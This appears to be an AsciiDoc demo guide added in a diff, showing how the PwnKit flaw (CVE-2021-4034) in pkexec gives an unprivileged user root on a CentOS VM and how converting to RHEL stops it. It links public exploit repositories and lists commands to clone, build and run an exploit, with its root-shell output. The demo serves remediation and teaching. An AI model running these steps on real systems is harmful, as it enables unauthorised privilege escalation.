@@ -1,0 +1,99 @@
+= Demo PwnKit security escallation and remediation
+
+PwnKit is the name associated with https://access.redhat.com/security/cve/CVE-2021-4034[CVE-2021-4034] - Pkexec Local Privilege Escalation.
+
+There are a number of sample escallation examples availble today including
+
+* https://github.com/ly4k/PwnKit
+* https://github.com/luijait/PwnKit-Exploit.git
+
+For this demo we'll show how the standard Cloud Images for Centos
+are impacted by the exploit that once updated to RHEL the exploit has been remediated
+
+== Demo Pre-work ==
+
+First we need a Centos Virtual machine
+
+- Deploy a link:Demo_VM.adoc[local or cloud hosted Centos Linux environment]
+
+For Centos 8 we also need to update the yum repositories to point to
+the centos vault.
+
+[source,bash]
+----
+ssh leapp2rhel
+
+# wait for the login to complete
+
+sed -i 's/^mirrorlist/#mirrorlist/g' /etc/yum.repos.d/CentOS-*
+sed -i 's|#baseurl=http://mirror.centos.org|baseurl=https://vault.centos.org|g' /etc/yum.repos.d/CentOS-*
+----
+
+
+Install the required tools into your VM and build the exploit
+
+[source,bash]
+----
+
+yum install gcc make
+
+
+# Clone the exploit code, and build the exploit
+git clone https://github.com/luijait/PwnKit-Exploit.git
+
+cd PwnKit-Exploit/
+make
+
+Copy the exploit to a temp directory, and create a new user without sudo privileges
+cp exploit /tmp/
+useradd developer
+Switch to the developer user, and copy the exploit binary to the home dir
+cp /tmp/exploit /home/developer
+
+----
+
+== Live Demo ==
+
+The flow is
+
+* Show the exploit exists under our _developer_ user
+* Convert link:Demo_Convert2RHEL.adoc[Centos environment to RHEL] with Convert2RHEL
+* Show the exploit no longer works
+
+[source,bash]
+----
+
+# Login as our developer user
+ssh developer@leapp2rhel
+
+sudo -i
+# Should produce a response similar to
+[sudo] password for developer:
+developer is not in the sudoers file.
+This incident will be reported.
+
+./exploit
+Current User before execute exploit
+hacker@victim$whoami: developer
+Exploit written by @luijait (0x6c75696a616974)mkdir: cannot create directory
+‘GCONV_PATH=.’: File exists
+mkdir: cannot create directory ‘tmp’: File exists
+[+] Enjoy your root if exploit was completed succesfully
+[root@centos8 developer]# id
+uid=0(root) gid=0(root) groups=0(root),1001(developer)
+context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+----
+
+Convert link:Demo_Convert2RHEL.adoc[Centos environment to RHEL] with Convert2RHEL
+
+[source,bash]
+----
+# Login as our developer user
+ssh developer@leapp2rhel
+
+./exploit
+# Exploit fails
+
+----
+
+link:../README.adoc[Return]
